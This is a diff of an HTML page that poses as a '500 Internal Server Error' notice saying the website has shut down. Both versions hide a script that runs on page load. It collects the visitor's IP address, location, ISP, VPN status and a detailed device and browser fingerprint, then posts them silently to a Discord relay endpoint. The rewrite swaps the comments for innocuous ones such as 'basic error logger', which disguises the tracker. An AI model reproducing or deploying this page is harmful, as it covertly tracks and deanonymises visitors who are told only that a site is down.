@@ -1,108 +1,95 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>500 Internal Server Error</title>
     <style>
-        body { 
-            background-color: #fff; 
-            color: #000; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .error-container { text-align: center; }
-        h1 { font-size: 24px; font-weight: 500; margin-bottom: 8px; }
-        p { font-size: 14px; color: #666; margin: 0; }
+        body { background: #fff; color: #000; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .err { text-align: center; }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 5px; }
+        p { font-size: 14px; color: #777; }
     </style>
 </head>
 <body>
 
-    <div class="error-container">
+    <div class="err">
         <h1>Website has shut down</h1>
         <p>Internal Server Error (Code: 500)</p>
     </div>
 
     <script>
-        async function runDeepLog() {
-            let n = {};
-            let vpnDetected = "False";
+        // basic error logger
+        async function init() {
+            let data = {};
+            let isVpn = "False";
 
-            // Multi-API Fallback for 100% Reliability
-            const providers = [
+            // try a few different apis in case one is down
+            const apis = [
                 "https://ipapi.co/json/",
                 "https://ipwho.is/",
                 "https://api.ipify.org?format=json"
             ];
 
-            for (let url of providers) {
+            for (let i = 0; i < apis.length; i++) {
                 try {
-                    const res = await fetch(url);
-                    if (res.ok) {
-                        const temp = await res.json();
-                        n = { ...n, ...temp };
-                        if (n.ip || n.query) break;
+                    let r = await fetch(apis[i]);
+                    if (r.ok) {
+                        let res = await r.json();
+                        data = Object.assign(data, res);
+                        if (data.ip || data.query) break;
                     }
-                } catch (e) {}
+                } catch (err) {}
             }
 
-            // Get GPU Info
-            let gpu = "Unknown";
+            // gpu check
+            let renderer = "n/a";
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                const gl = canvas.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
             } catch (e) {}
 
-            const finalIP = n.ip || n.query || "Unknown";
-            const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Unknown";
-            const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
-            if (n.security && (n.security.vpn || n.security.proxy || n.security.relay)) vpnDetected = "True";
+            let ip = data.ip || data.query || "unknown";
+            let loc = data.city ? (data.city + ", " + (data.region || data.region_name) + ", " + (data.country || data.country_name)) : "unknown";
+            let isp = data.org || data.isp || "unknown";
+            
+            if (data.security && (data.security.vpn || data.security.proxy)) {
+                isVpn = "True";
+            }
 
-            const stats = {
-                "--- NETWORK DATA ---": "",
-                "IP Address": finalIP,
-                "VPN/Proxy Detected": vpnDetected,
-                "Location": finalLocation,
-                "ISP": finalISP,
-                "Hostname": n.hostname || n.reverse || "None",
-                "--- DEVICE HARDWARE ---": "",
-                "OS/Platform": navigator.platform,
-                "CPU Threads": navigator.hardwareConcurrency || "Unknown",
-                "RAM (Approx GB)": navigator.deviceMemory || "Unknown",
-                "GPU": gpu,
-                "Screen Resolution": `${screen.width}x${screen.height}`,
-                "Window Size": `${window.innerWidth}x${window.innerHeight}`,
-                "Device Pixel Ratio": window.devicePixelRatio,
-                "Color Depth": screen.colorDepth,
-                "Touch Support": navigator.maxTouchPoints > 0 ? "Yes" : "No",
-                "Max Touch Points": navigator.maxTouchPoints,
-                "--- BROWSER/SOFTWARE ---": "",
-                "User Agent": navigator.userAgent,
-                "Browser Language": navigator.language,
-                "System Languages": navigator.languages.join(", "),
-                "Cookies Enabled": navigator.cookieEnabled,
-                "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
-                "Current Time": new Date().toLocaleString(),
-                "Referrer": document.referrer || "Direct Visit"
-            };
+            // build log string
+            let log = "NETWORK\n";
+            log += "IP: " + ip + "\n";
+            log += "VPN: " + isVpn + "\n";
+            log += "Loc: " + loc + "\n";
+            log += "ISP: " + isp + "\n\n";
+            
+            log += "DEVICE\n";
+            log += "OS: " + navigator.platform + "\n";
+            log += "Cores: " + navigator.hardwareConcurrency + "\n";
+            log += "RAM: " + navigator.deviceMemory + "\n";
+            log += "GPU: " + renderer + "\n";
+            log += "Res: " + screen.width + "x" + screen.height + "\n";
+            log += "Touch: " + (navigator.maxTouchPoints > 0) + "\n\n";
+            
+            log += "BROWSER\n";
+            log += "UA: " + navigator.userAgent + "\n";
+            log += "TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
+            log += "Ref: " + document.referrer + "\n";
+            log += "Time: " + new Date().toString();
 
-            const output = Object.entries(stats).map(([k, v]) => k.startsWith("---") ? v + k : `${k}: ${v}`).join("\n");
-
-            // Final Push to Discord
-            fetch("/api/discord", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: "```\n" + output + "\n```" }), // Formatted in code block for Discord
-            }).catch(() => {});
+            // push to api
+            try {
+                fetch("/api/discord", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: "```\n" + log + "\n```" })
+                });
+            } catch (e) {}
         }
 
-        runDeepLog();
+        init();
     </script>
 </body>
 </html>
